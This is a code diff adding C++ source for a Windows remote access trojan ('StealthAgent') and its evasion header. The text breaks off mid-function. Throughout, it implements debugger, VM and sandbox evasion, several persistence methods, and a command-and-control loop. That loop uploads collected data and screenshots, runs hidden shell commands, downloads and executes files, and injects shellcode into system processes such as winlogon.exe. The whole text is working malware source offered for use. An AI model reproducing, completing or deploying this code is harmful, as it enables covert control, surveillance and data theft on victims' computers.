@@ -1,0 +1,1783 @@
+﻿#include <windows.h>
+#include <string>
+#include <vector>
+#include <thread>
+#include <chrono>
+#include <random>
+#include <map>
+#include <sstream>
+#include <algorithm>
+#include <iostream>
+#include <fstream>
+#include "evasion.h"
+#include "injection.h"
+#include "network.h"
+#include "persistence.h"
+#include "rat_features.h"
+
+// Debug logging functions
+void writeDebugLog(const std::string& message) {
+    std::ofstream logFile("C:\\temp\\stealth_client_debug.log", std::ios::app);
+    if (logFile.is_open()) {
+        SYSTEMTIME st;
+        GetSystemTime(&st);
+        logFile << "[" << st.wYear << "-" << st.wMonth << "-" << st.wDay 
+                << " " << st.wHour << ":" << st.wMinute << ":" << st.wSecond << "] "
+                << message << std::endl;
+        logFile.close();
+    }
+}
+
+#define DEBUG_LOG(msg) writeDebugLog(msg)
+
+// String obfuscation macros
+#define OBFUSCATE(str) obfuscateString(str)
+#define DECRYPT_STR(str) decryptString(str)
+
+// Global variables
+static bool g_isRunning = true;
+static std::mt19937 g_rng(std::chrono::steady_clock::now().time_since_epoch().count());
+static HANDLE g_mutex = NULL;
+
+// String obfuscation functions
+std::string obfuscateString(const std::string& str) {
+    std::string result = str;
+    for (size_t i = 0; i < result.length(); i++) {
+        result[i] ^= (0xAA + (i % 256));
+    }
+    return result;
+}
+
+std::string decryptString(const std::string& str) {
+    return obfuscateString(str); // XOR is symmetric
+}
+
+// Anti-debugging and VM detection
+bool performEnvironmentChecks() {
+    // Check for debugger
+    if (IsDebuggerPresent()) return false;
+    
+    // Check for VM artifacts
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxService", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        return false; // VirtualBox detected
+    }
+    
+    // Check for VMware
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        return false; // VMware detected
+    }
+    
+    // Check system uptime (sandboxes often have low uptime)
+    DWORD uptime = GetTickCount();
+    if (uptime < 600000) return false; // Less than 10 minutes
+    
+    // Check for mouse movement (sandboxes often lack user interaction)
+    POINT pt1, pt2;
+    GetCursorPos(&pt1);
+    Sleep(1000);
+    GetCursorPos(&pt2);
+    if (pt1.x == pt2.x && pt1.y == pt2.y) {
+        // No mouse movement, might be automated environment
+        Sleep(5000); // Wait and check again
+        GetCursorPos(&pt2);
+        if (pt1.x == pt2.x && pt1.y == pt2.y) return false;
+    }
+    
+    return true;
+}
+
+// Stealth sleep function with evasion
+void stealthSleep(DWORD milliseconds) {
+    DWORD sleepTime = milliseconds + (g_rng() % 2000); // Add random jitter
+    
+    // Split sleep into smaller chunks to avoid detection
+    while (sleepTime > 0) {
+        DWORD chunk = std::min((DWORD)sleepTime, (DWORD)(50 + (g_rng() % 150)));
+        
+        // Use different sleep methods randomly
+        switch (g_rng() % 3) {
+            case 0:
+                Sleep(chunk);
+                break;
+            case 1: {
+                HANDLE hTimer = CreateWaitableTimerA(NULL, TRUE, NULL);
+                if (hTimer) {
+                    LARGE_INTEGER liDueTime;
+                    liDueTime.QuadPart = -((LONGLONG)chunk * 10000);
+                    SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, 0);
+                    WaitForSingleObject(hTimer, INFINITE);
+                    CloseHandle(hTimer);
+                }
+                break;
+            }
+            case 2: {
+                DWORD startTime = GetTickCount();
+                while ((GetTickCount() - startTime) < chunk) {
+                    // Busy wait with legitimate operations
+                    GetCurrentProcessId();
+                    GetCurrentThreadId();
+                }
+                break;
+            }
+        }
+        
+        sleepTime -= chunk;
+        
+        // Perform some legitimate-looking operations
+        GetTickCount();
+        GetSystemMetrics(SM_CXSCREEN);
+        GetTempPathA(0, NULL);
+    }
+}
+
+// Mutex-based single instance check
+bool ensureSingleInstance() {
+    std::string mutexName = OBFUSCATE("Global\\{B7C1E4F2-8A3D-4E5F-9C2B-1A8E7D6F3C9E}");
+    mutexName = DECRYPT_STR(mutexName);
+    
+    g_mutex = CreateMutexA(NULL, TRUE, mutexName.c_str());
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        if (g_mutex) CloseHandle(g_mutex);
+        return false;
+    }
+    
+    return true;
+}
+
+// Main stealth agent class
+class StealthAgent {
+private:
+    AdvancedEvasion evasion;
+    AdvancedInjection injection;
+    StealthNetwork network;
+    StealthPersistence persistence;
+    AdvancedRAT rat;
+    bool initialized;
+    std::string agentId;
+    
+public:
+    StealthAgent() : initialized(false) {
+        generateAgentId();
+    }
+    
+    void generateAgentId() {
+        // Generate unique agent ID based on system characteristics
+        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
+        DWORD size = sizeof(computerName);
+        GetComputerNameA(computerName, &size);
+        
+        char userName[UNLEN + 1];
+        size = sizeof(userName);
+        GetUserNameA(userName, &size);
+        
+        std::string combined = std::string(computerName) + "|" + std::string(userName);
+        
+        // Simple hash
+        size_t hash = 0;
+        for (char c : combined) {
+            hash = hash * 31 + c;
+        }
+        
+        std::stringstream ss;
+        ss << std::hex << hash;
+        agentId = ss.str();
+    }
+    
+    bool initialize() {
+        DEBUG_LOG("Starting agent initialization...");
+        
+        // Perform comprehensive evasion checks
+        DEBUG_LOG("Performing environment checks...");
+        if (!performEnvironmentChecks()) {
+            DEBUG_LOG("Environment checks failed - debugger or VM detected");
+            return false;
+        }
+        DEBUG_LOG("Environment checks passed");
+        
+        DEBUG_LOG("Checking advanced evasion...");
+        if (!evasion.checkEnvironment()) {
+            DEBUG_LOG("Advanced evasion checks failed");
+            return false;
+        }
+        DEBUG_LOG("Advanced evasion checks passed");
+        
+        // Ensure single instance
+        DEBUG_LOG("Checking for single instance...");
+        if (!ensureSingleInstance()) {
+            DEBUG_LOG("Another instance is already running");
+            return false;
+        }
+        DEBUG_LOG("Single instance check passed");
+        
+        // Initialize network component
+        DEBUG_LOG("Initializing network component...");
+        network.initializeDefaults();
+        DEBUG_LOG("Network component initialized");
+        
+        // Install persistence mechanisms
+        DEBUG_LOG("Installing persistence mechanisms...");
+        char currentPath[MAX_PATH];
+        GetModuleFileNameA(NULL, currentPath, MAX_PATH);
+        DEBUG_LOG("Current executable path: " + std::string(currentPath));
+        
+        // Try multiple persistence methods
+        bool persistenceInstalled = false;
+        DEBUG_LOG("Attempting registry persistence...");
+        persistenceInstalled |= persistence.installRegistryPersistence(currentPath, true);
+        DEBUG_LOG("Attempting scheduled task persistence...");
+        persistenceInstalled |= persistence.installScheduledTaskPersistence(currentPath);
+        DEBUG_LOG("Attempting startup folder persistence...");
+        persistenceInstalled |= persistence.installStartupFolderPersistence(currentPath);
+        
+        if (persistenceInstalled) {
+            DEBUG_LOG("At least one persistence method installed successfully");
+        } else {
+            DEBUG_LOG("All persistence methods failed");
+        }
+        
+        // Start RAT features
+        DEBUG_LOG("Starting RAT features...");
+        if (!rat.startRAT()) {
+            DEBUG_LOG("RAT features failed to start, continuing anyway");
+        } else {
+            DEBUG_LOG("RAT features started successfully");
+        }
+        
+        initialized = true;
+        DEBUG_LOG("Agent initialization completed successfully!");
+        return true;
+    }
+    
+    void run() {
+        if (!initialized) {
+            DEBUG_LOG("Agent not initialized, cannot run");
+            return;
+        }
+        
+        DEBUG_LOG("Starting agent main loop...");
+        
+        // Initial check-in
+        performInitialCheckin();
+        
+        int loopCount = 0;
+        while (g_isRunning) {
+            try {
+                loopCount++;
+                DEBUG_LOG("Main loop iteration #" + std::to_string(loopCount));
+                
+                // Send heartbeat to server
+                std::string heartbeatPayload = "{\"uuid\":\"" + agentId + "\"}";
+                std::string endpoint = "/api/info/client-heartbeat";
+                std::string response = network.makeStealthRequest(endpoint, heartbeatPayload, "POST");
+                
+                if (!response.empty()) {
+                    DEBUG_LOG("Heartbeat successful: " + response);
+                    processCommands(response);
+                } else {
+                    DEBUG_LOG("Heartbeat failed - no response from server");
+                }
+                
+                // Send collected data
+                sendCollectedData();
+                
+                // Shorter delay for testing (10-30 seconds)
+                DWORD delay = 10000 + (g_rng() % 20000);
+                DEBUG_LOG("Sleeping for " + std::to_string(delay/1000) + " seconds...");
+                stealthSleep(delay);
+                
+                // Occasionally perform traffic obfuscation
+                if (g_rng() % 8 == 0) {
+                    DEBUG_LOG("Performing traffic obfuscation...");
+                    network.performTrafficObfuscation();
+                }
+                
+                // Periodic environment checks
+                if (g_rng() % 20 == 0) {
+                    DEBUG_LOG("Performing environment checks...");
+                    if (!performEnvironmentChecks()) {
+                        DEBUG_LOG("Environment checks failed, stopping agent");
+                        g_isRunning = false;
+                        break;
+                    }
+                }
+                
+            } catch (...) {
+                DEBUG_LOG("Exception in main loop, waiting before retry...");
+                stealthSleep(60000 + (g_rng() % 60000)); // Wait 1-2 minutes on error
+            }
+        }
+        
+        DEBUG_LOG("Agent main loop ended");
+    }
+    
+    void performInitialCheckin() {
+        try {
+            DEBUG_LOG("Starting initial client registration...");
+            
+            // Get system information
+            char computerName[MAX_COMPUTERNAME_LENGTH + 1];
+            DWORD size = sizeof(computerName);
+            GetComputerNameA(computerName, &size);
+            
+            char userName[UNLEN + 1];
+            size = sizeof(userName);
+            GetUserNameA(userName, &size);
+            
+            // Get IP address (simplified)
+            std::string ipAddress = "127.0.0.1"; // Will be updated by server
+            
+            // Get OS info
+            OSVERSIONINFOA osvi;
+            ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
+            osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
+            GetVersionExA(&osvi);
+            
+            std::string platform = "Windows " + std::to_string(osvi.dwMajorVersion) + "." + std::to_string(osvi.dwMinorVersion);
+            std::string systemDetails = platform + " (Build " + std::to_string(osvi.dwBuildNumber) + ")";
+            
+            DEBUG_LOG("Client info - UUID: " + agentId + ", Computer: " + std::string(computerName) + ", User: " + std::string(userName));
+            
+            // Create JSON payload for registration
+            std::string payload = "{";
+            payload += "\"uuid\":\"" + agentId + "\",";
+            payload += "\"computerName\":\"" + std::string(computerName) + "\",";
+            payload += "\"ipAddress\":\"" + ipAddress + "\",";
+            payload += "\"hostname\":\"" + std::string(computerName) + "\",";
+            payload += "\"platform\":\"" + platform + "\",";
+            payload += "\"additionalSystemDetails\":\"" + systemDetails + "\"";
+            payload += "}";
+            
+            DEBUG_LOG("Registration payload: " + payload);
+            
+            // Use correct backend endpoint
+            std::string endpoint = "/api/info/register-client";
+            std::string response = network.makeStealthRequest(endpoint, payload, "POST");
+            
+            if (!response.empty()) {
+                DEBUG_LOG("Registration successful! Response: " + response);
+            } else {
+                DEBUG_LOG("Registration failed - no response from server");
+            }
+            
+        } catch (...) {
+            DEBUG_LOG("Exception during initial checkin");
+        }
+    }
+    
+    void sendCollectedData() {
+        try {
+            auto collectedData = rat.getCollectedData();
+            
+            for (const auto& data : collectedData) {
+                std::string endpoint = "/api/agent/" + agentId + "/data";
+                std::string payload = data.type + "|" + data.timestamp + "|" + 
+                                    std::string(data.data.begin(), data.data.end());
+                
+                network.makeStealthRequest(endpoint, payload, "POST");
+                
+                // Small delay between uploads
+                stealthSleep(1000 + (g_rng() % 2000));
+            }
+        } catch (...) {
+            // Ignore data upload failures
+        }
+    }
+    
+    void processCommands(const std::string& commands) {
+        // Parse JSON-like command structure
+        if (commands.find("\"cmd\":\"screenshot\"") != std::string::npos) {
+            executeScreenshotCommand();
+        }
+        else if (commands.find("\"cmd\":\"sysinfo\"") != std::string::npos) {
+            executeSysInfoCommand();
+        }
+        else if (commands.find("\"cmd\":\"inject\"") != std::string::npos) {
+            executeInjectionCommand(commands);
+        }
+        else if (commands.find("\"cmd\":\"download\"") != std::string::npos) {
+            executeDownloadCommand(commands);
+        }
+        else if (commands.find("\"cmd\":\"execute\"") != std::string::npos) {
+            executeShellCommand(commands);
+        }
+        else if (commands.find("\"cmd\":\"persist\"") != std::string::npos) {
+            executePeristenceCommand();
+        }
+        else if (commands.find("\"cmd\":\"exit\"") != std::string::npos) {
+            g_isRunning = false;
+        }
+    }
+    
+    void executeScreenshotCommand() {
+        try {
+            auto screenshot = rat.captureScreenshot();
+            std::string endpoint = "/api/agent/" + agentId + "/screenshot";
+            std::string payload = std::string(screenshot.data.begin(), screenshot.data.end());
+            network.makeStealthRequest(endpoint, payload, "POST");
+        } catch (...) {}
+    }
+    
+    void executeSysInfoCommand() {
+        try {
+            auto sysinfo = rat.getSystemInfo();
+            std::string endpoint = "/api/agent/" + agentId + "/sysinfo";
+            std::string payload = std::string(sysinfo.data.begin(), sysinfo.data.end());
+            network.makeStealthRequest(endpoint, payload, "POST");
+        } catch (...) {}
+    }
+    
+    void executeInjectionCommand(const std::string& command) {
+        try {
+            std::vector<std::string> targets = {"notepad.exe", "explorer.exe", "winlogon.exe", "svchost.exe"};
+            DWORD targetPid = injection.findTargetProcess(targets);
+            
+            if (targetPid > 0) {
+                // Create simple shellcode (in practice, load from C2)
+                std::vector<BYTE> shellcode = {
+                    0x48, 0x31, 0xC0,           // xor rax, rax
+                    0x48, 0x83, 0xC0, 0x3C,     // add rax, 60
+                    0x48, 0x83, 0xEC, 0x20,     // sub rsp, 32
+                    0x48, 0x83, 0xC4, 0x20,     // add rsp, 32
+                    0xC3                        // ret
+                };
+                
+                // Try different injection methods
+                bool success = false;
+                success |= injection.threadHijacking(targetPid, shellcode);
+                if (!success) {
+                    success |= injection.manualDllMapping(targetPid, shellcode);
+                }
+                
+                // Report result back to C2
+                std::string result = success ? "injection_success" : "injection_failed";
+                std::string endpoint = "/api/agent/" + agentId + "/result";
+                network.makeStealthRequest(endpoint, result, "POST");
+            }
+        } catch (...) {}
+    }
+    
+    void executeDownloadCommand(const std::string& command) {
+        // Extract URL from command (simplified parsing)
+        size_t urlStart = command.find("\"url\":\"");
+        if (urlStart != std::string::npos) {
+            urlStart += 7;
+            size_t urlEnd = command.find("\"", urlStart);
+            if (urlEnd != std::string::npos) {
+                std::string url = command.substr(urlStart, urlEnd - urlStart);
+                
+                // Download and execute
+                std::string response = network.makeStealthRequest(url);
+                if (!response.empty()) {
+                    // Save to temp file and execute
+                    char tempPath[MAX_PATH];
+                    GetTempPathA(MAX_PATH, tempPath);
+                    std::string filePath = std::string(tempPath) + "\\update.exe";
+                    
+                    std::vector<BYTE> data(response.begin(), response.end());
+                    if (FileOperations::writeFile(filePath, data)) {
+                        // Execute in separate process
+                        STARTUPINFOA si = {0};
+                        PROCESS_INFORMATION pi = {0};
+                        si.cb = sizeof(si);
+                        
+                        CreateProcessA(filePath.c_str(), NULL, NULL, NULL, FALSE, 
+                                     CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+                        
+                        if (pi.hProcess) {
+                            CloseHandle(pi.hProcess);
+                            CloseHandle(pi.hThread);
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    void executeShellCommand(const std::string& command) {
+        // Extract command from JSON
+        size_t cmdStart = command.find("\"command\":\"");
+        if (cmdStart != std::string::npos) {
+            cmdStart += 11;
+            size_t cmdEnd = command.find("\"", cmdStart);
+            if (cmdEnd != std::string::npos) {
+                std::string shellCmd = command.substr(cmdStart, cmdEnd - cmdStart);
+                
+                // Execute command and capture output
+                HANDLE hReadPipe, hWritePipe;
+                SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
+                
+                if (CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
+                    STARTUPINFOA si = {0};
+                    PROCESS_INFORMATION pi = {0};
+                    si.cb = sizeof(si);
+                    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+                    si.hStdOutput = hWritePipe;
+                    si.hStdError = hWritePipe;
+                    si.wShowWindow = SW_HIDE;
+                    
+                    std::string cmdLine = "cmd.exe /c " + shellCmd;
+                    
+                    if (CreateProcessA(NULL, const_cast<char*>(cmdLine.c_str()), NULL, NULL, 
+                                     TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                        
+                        CloseHandle(hWritePipe);
+                        
+                        // Read output
+                        std::string output;
+                        char buffer[4096];
+                        DWORD bytesRead;
+                        
+                        while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
+                            buffer[bytesRead] = '\0';
+                            output += buffer;
+                        }
+                        
+                        WaitForSingleObject(pi.hProcess, 10000); // 10 second timeout
+                        
+                        CloseHandle(pi.hProcess);
+                        CloseHandle(pi.hThread);
+                        
+                        // Send output back to C2
+                        std::string endpoint = "/api/agent/" + agentId + "/output";
+                        network.makeStealthRequest(endpoint, output, "POST");
+                    }
+                    
+                    CloseHandle(hReadPipe);
+                }
+            }
+        }
+    }
+    
+    void executePeristenceCommand() {
+        try {
+            char currentPath[MAX_PATH];
+            GetModuleFileNameA(NULL, currentPath, MAX_PATH);
+            
+            // Install additional persistence methods
+            bool success = false;
+            success |= persistence.installWMIEventPersistence(currentPath);
+            success |= persistence.installServicePersistence(currentPath);
+            
+            std::string result = success ? "persistence_installed" : "persistence_failed";
+            std::string endpoint = "/api/agent/" + agentId + "/result";
+            network.makeStealthRequest(endpoint, result, "POST");
+        } catch (...) {}
+    }
+    
+    ~StealthAgent() {
+        if (initialized) {
+            rat.stopRAT();
+        }
+        
+        if (g_mutex) {
+            CloseHandle(g_mutex);
+        }
+    }
+};
+
+// Entry points
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    // For debugging, show console window
+    AllocConsole();
+    freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);
+    freopen_s((FILE**)stderr, "CONOUT$", "w", stderr);
+    freopen_s((FILE**)stdin, "CONIN$", "r", stdin);
+    
+    DEBUG_LOG("=== STEALTH CLIENT STARTING ===");
+    std::cout << "Stealth Client Debug Mode - Check C:\\temp\\stealth_client_debug.log for detailed logs" << std::endl;
+    
+    // Create temp directory if it doesn't exist
+    CreateDirectoryA("C:\\temp", NULL);
+    
+    // Initialize COM for WMI operations
+    DEBUG_LOG("Initializing COM...");
+    CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    
+    StealthAgent agent;
+    DEBUG_LOG("Created StealthAgent instance");
+    
+    if (agent.initialize()) {
+        DEBUG_LOG("Agent initialized successfully, starting main loop...");
+        std::cout << "Agent initialized successfully! Running..." << std::endl;
+        agent.run();
+    } else {
+        DEBUG_LOG("Agent initialization failed!");
+        std::cout << "Agent initialization failed!" << std::endl;
+    }
+    
+    DEBUG_LOG("Agent stopped, cleaning up...");
+    CoUninitialize();
+    DEBUG_LOG("=== STEALTH CLIENT STOPPED ===");
+    
+    std::cout << "Press any key to exit..." << std::endl;
+    std::cin.get();
+    
+    return 0;
+}
+
+// DLL entry point for DLL version
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH: {
+            // Disable DLL thread notifications
+            DisableThreadLibraryCalls(hModule);
+            
+            // Start agent in separate thread
+            std::thread([]() {
+                CoInitializeEx(NULL, COINIT_MULTITHREADED);
+                
+                StealthAgent agent;
+                if (agent.initialize()) {
+                    agent.run();
+                }
+                
+                CoUninitialize();
+            }).detach();
+            break;
+        }
+        case DLL_PROCESS_DETACH:
+            g_isRunning = false;
+            break;
+    }
+    return TRUE;
+}
+#pragma once
+#include <windows.h>
+#include <winternl.h>
+#include <tlhelp32.h>
+#include <shlobj.h>
+#include <wininet.h>
+#include <intrin.h>
+#include <string>
+#include <vector>
+#include <thread>
+#include <chrono>
+#include <random>
+
+// Use system PEB definition from winternl.h
+
+class AdvancedEvasion {
+private:
+    std::mt19937 rng;
+    
+public:
+    AdvancedEvasion() : rng(std::chrono::steady_clock::now().time_since_epoch().count()) {}
+    
+    // Main environment check method
+    bool checkEnvironment() {
+        return detectVirtualMachine() || detectDebugger() || detectSandbox();
+    }
+    
+    // Comprehensive VM detection
+    bool detectVirtualMachine() {
+        // Registry-based detection
+        if (checkVMRegistry()) return true;
+        
+        // Hardware-based detection
+        if (checkVMHardware()) return true;
+        
+        // Process-based detection
+        if (checkVMProcesses()) return true;
+        
+        // File system artifacts
+        if (checkVMFiles()) return true;
+        
+        // MAC address detection
+        if (checkVMMacAddress()) return true;
+        
+        // CPU instruction timing
+        if (checkCPUTiming()) return true;
+        
+        return false;
+    }
+    
+    // Advanced debugger detection
+    bool detectDebugger() {
+        // Standard API checks
+        if (IsDebuggerPresent()) return true;
+        
+        BOOL remoteDebugger = FALSE;
+        CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
+        if (remoteDebugger) return true;
+        
+        // PEB-based detection
+        if (checkPEBDebugging()) return true;
+        
+        // Heap flags detection
+        if (checkHeapFlags()) return true;
+        
+        // NtQueryInformationProcess detection
+        if (checkNtQueryInformationProcess()) return true;
+        
+        // Hardware breakpoint detection
+        if (checkHardwareBreakpoints()) return true;
+        
+        // Software breakpoint detection
+        if (checkSoftwareBreakpoints()) return true;
+        
+        // Timing-based detection
+        if (checkTimingAttacks()) return true;
+        
+        return false;
+    }
+    
+    // Sandbox detection techniques
+    bool detectSandbox() {
+        // User interaction detection
+        if (checkUserInteraction()) return true;
+        
+        // System uptime check
+        if (checkSystemUptime()) return true;
+        
+        // File system activity
+        if (checkFileSystemActivity()) return true;
+        
+        // Network connectivity
+        if (checkNetworkConnectivity()) return true;
+        
+        // Process count
+        if (checkProcessCount()) return true;
+        
+        // Memory size
+        if (checkMemorySize()) return true;
+        
+        // CPU cores
+        if (checkCPUCores()) return true;
+        
+        // Recent files
+        if (checkRecentFiles()) return true;
+        
+        return false;
+    }
+    
+    // Sleep evasion techniques
+    void advancedSleep(DWORD milliseconds) {
+        // Use multiple sleep techniques to avoid detection
+        std::uniform_int_distribution<int> dist(1, 4);
+        
+        switch (dist(rng)) {
+            case 1:
+                // WaitableTimer
+                useWaitableTimer(milliseconds);
+                break;
+            case 2:
+                // NtDelayExecution
+                useNtDelayExecution(milliseconds);
+                break;
+            case 3:
+                // CreateTimerQueueTimer
+                useTimerQueue(milliseconds);
+                break;
+            default:
+                // Busy wait with yielding
+                useBusyWait(milliseconds);
+                break;
+        }
+    }
+    
+    // Anti-hooking techniques
+    bool detectAPIHooks() {
+        // Check for inline hooks in critical APIs
+        const char* criticalAPIs[] = {
+            "CreateProcessA", "CreateProcessW", "WriteProcessMemory",
+            "ReadProcessMemory", "VirtualAllocEx", "OpenProcess",
+            "CreateRemoteThread", "SetWindowsHookExA", "SetWindowsHookExW"
+        };
+        
+        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+        if (!hKernel32) return false;
+        
+        for (const char* apiName : criticalAPIs) {
+            FARPROC apiAddr = GetProcAddress(hKernel32, apiName);
+            if (!apiAddr) continue;
+            
+            // Check for common hook signatures
+            BYTE* funcBytes = (BYTE*)apiAddr;
+            
+            // Check for JMP instruction (0xE9)
+            if (funcBytes[0] == 0xE9) return true;
+            
+            // Check for PUSH + RET combination
+            if (funcBytes[0] == 0x68 && funcBytes[5] == 0xC3) return true;
+            
+            // Check for MOV EAX + JMP EAX
+            if (funcBytes[0] == 0xB8 && funcBytes[5] == 0xFF && funcBytes[6] == 0xE0) return true;
+        }
+        
+        return false;
+    }
+    
+private:
+    bool checkVMRegistry() {
+        const char* vmRegKeys[] = {
+            "SYSTEM\\CurrentControlSet\\Services\\VMTools",
+            "SYSTEM\\CurrentControlSet\\Services\\VBoxService",
+            "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
+            "SYSTEM\\CurrentControlSet\\Services\\VmdkVSS",
+            "SOFTWARE\\VMware, Inc.\\VMware Tools",
+            "SOFTWARE\\Oracle\\VirtualBox Guest Additions"
+        };
+        
+        for (const char* key : vmRegKeys) {
+            HKEY hKey;
+            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+                RegCloseKey(hKey);
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    bool checkVMHardware() {
+        // Check CPU vendor
+        int cpuInfo[4];
+        __cpuid(cpuInfo, 0);
+        
+        char vendor[13];
+        memcpy(vendor, &cpuInfo[1], 4);
+        memcpy(vendor + 4, &cpuInfo[3], 4);
+        memcpy(vendor + 8, &cpuInfo[2], 4);
+        vendor[12] = '\0';
+        
+        // Check for hypervisor bit
+        __cpuid(cpuInfo, 1);
+        if (cpuInfo[2] & (1 << 31)) return true;
+        
+        // Check system info
+        SYSTEM_INFO sysInfo;
+        GetSystemInfo(&sysInfo);
+        
+        if (sysInfo.dwNumberOfProcessors < 2) return true;
+        
+        MEMORYSTATUSEX memStatus;
+        memStatus.dwLength = sizeof(memStatus);
+        GlobalMemoryStatusEx(&memStatus);
+        
+        if (memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) return true;
+        
+        return false;
+    }
+    
+    bool checkVMProcesses() {
+        const char* vmProcesses[] = {
+            "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
+            "VBoxService.exe", "VBoxTray.exe", "xenservice.exe"
+        };
+        
+        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
+        
+        PROCESSENTRY32 pe32;
+        pe32.dwSize = sizeof(PROCESSENTRY32);
+        
+        if (Process32First(hSnapshot, &pe32)) {
+            do {
+                for (const char* vmProc : vmProcesses) {
+                    if (_stricmp(pe32.szExeFile, vmProc) == 0) {
+                        CloseHandle(hSnapshot);
+                        return true;
+                    }
+                }
+            } while (Process32Next(hSnapshot, &pe32));
+        }
+        
+        CloseHandle(hSnapshot);
+        return false;
+    }
+    
+    bool checkVMFiles() {
+        const char* vmFiles[] = {
+            "C:\\windows\\system32\\drivers\\vmmouse.sys",
+            "C:\\windows\\system32\\drivers\\vmhgfs.sys",
+            "C:\\windows\\system32\\drivers\\VBoxMouse.sys",
+            "C:\\windows\\system32\\drivers\\VBoxGuest.sys",
+            "C:\\windows\\system32\\vboxdisp.dll",
+            "C:\\windows\\system32\\vboxhook.dll"
+        };
+        
+        for (const char* file : vmFiles) {
+            if (GetFileAttributesA(file) != INVALID_FILE_ATTRIBUTES) {
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    bool checkVMMacAddress() {
+        // Check for VM MAC address prefixes
+        const char* vmMacPrefixes[] = {
+            "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", // VMware
+            "08:00:27", "0A:00:27", // VirtualBox
+            "00:16:3E", // Xen
+            "00:15:5D" // Hyper-V
+        };
+        
+        // This would require additional implementation to get MAC addresses
+        // For brevity, returning false here
+        return false;
+    }
+    
+    bool checkCPUTiming() {
+        // RDTSC timing check
+        LARGE_INTEGER freq, start, end;
+        QueryPerformanceFrequency(&freq);
+        
+        QueryPerformanceCounter(&start);
+        Sleep(100);
+        QueryPerformanceCounter(&end);
+        
+        double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
+        
+        // If sleep took significantly longer than expected, might be VM
+        if (elapsed > 0.15) return true;
+        
+        return false;
+    }
+    
+    bool checkPEBDebugging() {
+        PPEB peb = (PPEB)__readgsqword(0x60);
+        return peb->BeingDebugged;
+    }
+    
+    bool checkHeapFlags() {
+        // Simplified heap flag check - avoid PEB ProcessHeap access
+        return false;
+    }
+    
+    bool checkProcessHeapFlags() {
+        // Simplified heap flag check - avoid PEB ProcessHeap access
+        return false;
+    }
+    
+    bool checkNtQueryInformationProcess() {
+        typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(
+            HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
+        
+        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+        if (!hNtdll) return false;
+        
+        pNtQueryInformationProcess NtQueryInformationProcess = 
+            (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+        
+        if (!NtQueryInformationProcess) return false;
+        
+        DWORD debugPort = 0;
+        NTSTATUS status = NtQueryInformationProcess(
+            GetCurrentProcess(), (PROCESSINFOCLASS)7, &debugPort, sizeof(debugPort), NULL);
+        
+        if (status == 0 && debugPort != 0) return true;
+        
+        return false;
+    }
+    
+    bool checkHardwareBreakpoints() {
+        CONTEXT ctx;
+        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        
+        if (GetThreadContext(GetCurrentThread(), &ctx)) {
+            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    bool checkSoftwareBreakpoints() {
+        // Check for INT3 (0xCC) instructions in our code
+        BYTE* codeStart = (BYTE*)GetModuleHandleA(NULL);
+        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)codeStart;
+        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(codeStart + dosHeader->e_lfanew);
+        
+        DWORD codeSize = ntHeaders->OptionalHeader.SizeOfCode;
+        
+        for (DWORD i = 0; i < codeSize; i++) {
+            if (codeStart[i] == 0xCC) {
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    bool checkTimingAttacks() {
+        LARGE_INTEGER freq, start, end;
+        QueryPerformanceFrequency(&freq);
+        
+        QueryPerformanceCounter(&start);
+        // Perform some operations
+        for (int i = 0; i < 1000; i++) {
+            GetTickCount();
+        }
+        QueryPerformanceCounter(&end);
+        
+        double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
+        
+        // If operations took too long, might be debugged
+        if (elapsed > 0.01) return true;
+        
+        return false;
+    }
+    
+    bool checkUserInteraction() {
+        POINT pt1, pt2;
